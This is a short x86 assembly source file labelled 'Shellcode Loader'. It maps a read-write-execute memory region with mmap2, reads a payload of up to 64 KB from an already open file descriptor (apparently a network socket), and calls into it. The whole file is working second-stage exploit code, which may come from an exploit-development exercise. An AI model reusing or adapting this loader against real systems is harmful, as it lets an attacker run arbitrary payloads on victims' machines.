    ;; Evan Jensen
    ;; Kai Wen Zhong
    ;; 030913
    ;; Shellcode Loader
    ;; mmap2 = 0xc0, read = 3,


;;   eb034:       8b 5c 24 14             mov    ebx,DWORD PTR [esp+0x14]
;;   eb038:       8b 4c 24 18             mov    ecx,DWORD PTR [esp+0x18]
;;   eb03c:       8b 54 24 1c             mov    edx,DWORD PTR [esp+0x1c]
;;   eb040:       8b 74 24 20             mov    esi,DWORD PTR [esp+0x20]
;;   eb044:       8b 7c 24 24             mov    edi,DWORD PTR [esp+0x24]
;;   eb048:       8b 6c 24 28             mov    ebp,DWORD PTR [esp+0x28]

    ;; EBX, ECX, EDX, ESI, EDI, EBP
    %define LEN word 0xffff     ;TODO make this larger
    %define PROT byte 0x7       ;prot, PROT_READ | PROT_WRITE | PROT_EXEC
    %define FLAGS byte 0x22     ;flags, MAP_PRIVATE | MAP_ANONYMOUS
BITS 32
global main

main:
;; mmap2(0, 0xffff, 0x7, 0x22, 0, 0);
;; mmap2(0, LEN, PROT, FLAGS, 0,0);
mmap:
    xor ebx, ebx        ;addr = NULL

    xor ecx, ecx
    mov cx, LEN         ;length, 0xffff

    xor edx, edx
    mov dl, PROT

    xor esi, esi

    xor eax, eax
    mov al, FLAGS
    mov si, ax          ;lower part of esi is not accessable

    xor edi,edi
    dec edi             ;fd=-1
    xor ebp, ebp        ;offset=0


    mov al, 0xc0        ;mmap2=0xc0
    int 0x80

read:
    xor ebx, ebx
    ;;In production we will get ebx from code above "mmap"
    mov bl, 0x04        ;fd, ???

    mov ecx, eax        ;buf=mmap2(...)

    xor edx, edx
    mov dx, LEN         ;count, 0xffff

    xor eax,eax
    mov al,3
    int 0x80


    mov eax, ecx
    add eax, [ecx]

    call eax            ;Everything dies
